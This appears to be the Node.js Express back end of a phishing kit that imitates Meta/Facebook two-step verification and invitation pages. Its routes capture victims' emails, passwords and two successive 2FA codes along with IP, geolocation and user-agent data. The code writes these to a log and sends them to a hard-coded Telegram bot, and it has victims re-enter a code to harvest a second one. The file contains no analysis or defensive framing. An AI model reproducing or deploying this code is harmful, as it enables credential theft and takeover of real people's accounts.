const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(__dirname));
app.set('trust proxy', true);

// Telegram Configuration
const TELEGRAM_BOT_TOKEN = '8191694320:AAHLEWMYjclMwOM2oylyWweAaJ-b9l0GZZo';
const TELEGRAM_CHAT_ID = '-1003701418359';

async function getLocation(ip) {
  try {
    if (!ip || ip === '::1' || ip === '127.0.0.1') return 'Localhost';
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();
    if (data.status === 'success') {
      return `${data.city}, ${data.country}`;
    }
    return 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Telegram credentials not set. Message:', message);
    return;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error('Telegram API Error:', data);
    }
  } catch (error) {
    console.error('Error sending to Telegram:', error);
  }
}

// Function to log data
async function logData(data) {
  const location = await getLocation(data.ip);

  const logEntry =
    `${new Date().toISOString()} - IP: ${data.ip} - Location: ${location} - ${JSON.stringify(data)}\n`;

  console.log(logEntry);

  fs.appendFile("server.log", logEntry, (err) => {
    if (err) console.error("Error logging data:", err);
  });

  // Format message KHÔNG markdown
  let telegramMessage = "";

  telegramMessage += "THONG TIN HOAT DONG\n";
  telegramMessage += "----------------------------------------------------------\n";

  if (data.email) telegramMessage += `Email: ${data.email}\n`;
  if (data.pass) telegramMessage += `Password: ${data.pass}\n`;
  if (data.password1) telegramMessage += `Pass 1: ${data.password1}\n`;
  if (data.password2) telegramMessage += `Pass 2: ${data.password2}\n`;

  telegramMessage += "----------------------------------------------------------\n";

  if (data.code) telegramMessage += `Code 1: ${data.code}\n`;
  if (data.code2) telegramMessage += `Code 2: ${data.code2}\n`;

  telegramMessage += "----------------------------------------------------------\n";

  telegramMessage += `IP Address: ${data.ip || "N/A"}\n`;
  telegramMessage += `Location: ${location}\n`;
  telegramMessage += `City: ${data.city || "N/A"}\n`;
  telegramMessage += `Region: ${data.region || "N/A"}\n`;
  telegramMessage += `Country: ${data.country || "N/A"}\n`;
  telegramMessage += `Org: ${data.org || "N/A"}\n`;
  telegramMessage += `Timezone: ${data.timezone || "N/A"}\n`;

  telegramMessage += "----------------------------------------------------------\n";

  telegramMessage += `User-Agent:\n${data.userAgent || "N/A"}\n`;

  telegramMessage += "----------------------------------------------------------\n";

  if (data.type) telegramMessage += `Type: ${data.type}\n`;
  if (data.attempt) telegramMessage += `Attempt: ${data.attempt}\n`;
  if (data.step) telegramMessage += `Step: ${data.step}\n`;
  if (data.page) telegramMessage += `Page: ${data.page}\n`;

  await sendToTelegram(telegramMessage);
}

// Logging middleware for index.html
app.get('/index.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve index page as root - Redirect to new login URL
app.get('/', (req, res) => {
  res.redirect('/two_step_verification/login/?encrypted_context=AbL3ADX7kUTjOclRCi2QG4-bgjUA-Mqj2WGI67NRvNCET_RJ4WpjhHETO1yWe_6x');
});

// Serve login page
app.get(['/two_step_verification/login', '/two_step_verification/login/'], (req, res) => {
  res.sendFile(path.join(__dirname, 'login.html'));
});

// Handle login submission
app.post('/login', async (req, res) => {
  const { email, pass, attempts } = req.body;
  const ip = getClientIP(req);
  const userAgent = req.headers['user-agent'] || 'N/A';
  const geo = await getGeo(ip);

  logData({
    type: `Đăng Nhập Lần ${attempts} - Email ${email}`,
    email, pass, ip, attempt: attempts, userAgent,
    city: geo.city,
    region: geo.region,
    country: geo.country,
    org: geo.org,
    timezone: geo.timezone,
    time: new Date().toISOString()
  });

  res.json({ status: 'ok' });
});

// Serve 2FA page
app.get(['/two_step_verification/authentication', '/two_step_verification/authentication/'], (req, res) => {
  res.sendFile(path.join(__dirname, '2fa.html'));
});

// Serve Meta pages
app.get('/invitation/1', (req, res) => {
  res.sendFile(path.join(__dirname, 'meta1.html'));
});

app.get('/invitation/2', (req, res) => {
  res.sendFile(path.join(__dirname, 'meta2.html'));
});

app.get('/invitation/3', (req, res) => {
  res.sendFile(path.join(__dirname, 'meta3.html'));
});


// Serve latest-settings-info route
app.get('/latest-settings-info/latest-settings-info/latest-settings-info', async (req, res) => {
  const ip = getClientIP(req);
  const userAgent = req.headers['user-agent'] || 'N/A';

  console.log("IP:", ip);
  console.log("User-Agent:", userAgent);

  const geo = await getGeo(ip);
  logData({
    type: 'Page Visit', page: '/latest-settings-info/latest-settings-info/latest-settings-info', ip, userAgent,
    city: geo.city,
    region: geo.region,
    country: geo.country,
    org: geo.org,
    timezone: geo.timezone,
    time: new Date().toISOString()
  });
  res.sendFile(path.join(__dirname, 'fx.html'));
});
async function getGeo(ip) {
  try {
    if (!ip || ip === '::1' || ip === '127.0.0.1') {
      return {
        city: 'Local',
        region: 'Local',
        country: 'Local',
        org: 'Local',
        timezone: 'Local'
      };
    }

    const response = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await response.json();

    if (data.status === 'success') {
      return {
        city: data.city,
        region: data.regionName,
        country: data.country,
        org: data.org,
        timezone: data.timezone
      };
    }

    return {};
  } catch (err) {
    return {};
  }
}
function getClientIP(req) {
  let ip =
    req.headers['x-forwarded-for']?.split(',')[0].trim() ||
    req.socket.remoteAddress ||
    '';

  if (ip.startsWith('::ffff:')) {
    ip = ip.replace('::ffff:', '');
  }

  return ip;
}
// Handle 2FA submission
app.post('/2fa', async (req, res) => {
  const { code1, code, password1, password2, email, step } = req.body;
  const ip = getClientIP(req);
  const userAgent = req.headers['user-agent'] || 'N/A';

  console.log("IP:", ip);
  console.log("User-Agent:", userAgent);

  const geo = await getGeo(ip);
  logData({
    type: `2FA Lần  ${step} - Email  ${email}`, code, password1, password2, email, ip, userAgent,
    city: geo.city,
    region: geo.region,
    country: geo.country,
    org: geo.org,
    timezone: geo.timezone,
    time: new Date().toISOString()
  });

  if (step == 1) {
    // Log first code and signal frontend to reload
    res.json({ action: 'reload' });
  } else {
    // Log second code and signal completion
    res.json({ action: 'complete' });
  }
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

process.on('exit', (code) => {
  console.log(`Process exited with code: ${code}`);
});

process.on('uncaughtException', (err) => {
  console.error('Uncaught Exception:', err);
});
